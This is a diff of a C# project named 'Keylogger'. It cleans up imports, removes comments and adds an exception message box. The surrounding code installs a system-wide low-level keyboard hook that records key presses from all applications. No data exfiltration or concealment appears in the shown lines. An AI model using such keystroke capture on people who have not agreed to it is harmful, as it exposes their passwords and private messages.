@@ -1,9 +1,7 @@
 ﻿using System;
 using System.ComponentModel;
 using System.IO;
-using System.Text;
 using System.Windows;
-using System.Windows.Input;
 using System.Windows.Media.Imaging;
 using Microsoft.Win32;
 using System.Runtime.InteropServices;
@@ -11,8 +9,6 @@ using System.Drawing;
 using System.Windows.Interop;
 using System.Collections.Generic;
 using System.Diagnostics;
-using System.Globalization;
-using System.Windows.Input;
 
 
 namespace Keylogger
@@ -161,12 +157,10 @@ namespace Keylogger
 
         public void hook()
         {
-            //IntPtr hInstance = LoadLibrary("User32");
             using (Process curProcess = Process.GetCurrentProcess())
             using (ProcessModule curModule = curProcess.MainModule)
             {
                 hhook = SetWindowsHookEx(WH_KEYBOARD_LL, khp, GetModuleHandle(curModule.ModuleName), 0);
-               // MessageBox.Show(curModule.ToString());
             }
         }
 
@@ -180,14 +174,11 @@ namespace Keylogger
         {
             if (code >= 0)
             {
-                //розкладка
                 System.Windows.Forms.Keys key = (System.Windows.Forms.Keys)lParam.vkCode;
-                //if()
-                //MessageBox.Show(key.ToString());
-                if (_hookAll ? true : Enum.IsDefined(typeof(System.Windows.Forms.Keys), key)/*HookedKeys.Contains(key)*/)
+               
+                if (_hookAll ? true : Enum.IsDefined(typeof(System.Windows.Forms.Keys), key))
                 {
                     //
-                    //MessageBox.Show(HookedKeys.Count.ToString());
                     System.Windows.Forms.KeyEventArgs kea = new System.Windows.Forms.KeyEventArgs(key);
                     if ((wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) && (KeyDown != null))
                     {
@@ -212,33 +203,18 @@ namespace Keylogger
         [DllImport("user32.dll")]
         static extern IntPtr SetWindowsHookEx(int idHook, keyboardHookProc callback, IntPtr hInstance, uint threadId);
 
-        /// <summary>
-        /// Unhooks the windows hook.
-        /// </summary>
         /// <param name="hInstance">The hook handle that was returned from SetWindowsHookEx</param>
-        /// <returns>True if successful, false otherwise</returns>
         [DllImport("user32.dll")]
         static extern bool UnhookWindowsHookEx(IntPtr hInstance);
-
-        /// <summary>
-        /// Calls the next hook.
-        /// </summary>
         /// <param name="idHook">The hook id</param>
         /// <param name="nCode">The hook code</param>
         /// <param name="wParam">The wparam.</param>
         /// <param name="lParam">The lparam.</param>
-        /// <returns></returns>
         [DllImport("user32.dll")]
         static extern int CallNextHookEx(IntPtr idHook, int nCode, int wParam, ref keyboardHookStruct lParam);
-
-        /// <summary>
-        /// Loads the library.
-        /// </summary>
         /// <param name="lpFileName">Name of the library</param>
-        /// <returns>A handle to the library</returns>
         [DllImport("kernel32.dll")]
         static extern IntPtr LoadLibrary(string lpFileName);
-
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
 
@@ -310,9 +286,9 @@ namespace Keylogger
                     BitmapSizeOptions.FromEmptyOptions());
 
             }
-            catch (Exception)
+            catch (Exception ex)
             {
-
+                MessageBox.Show(ex.ToString());
             }
 
             finally
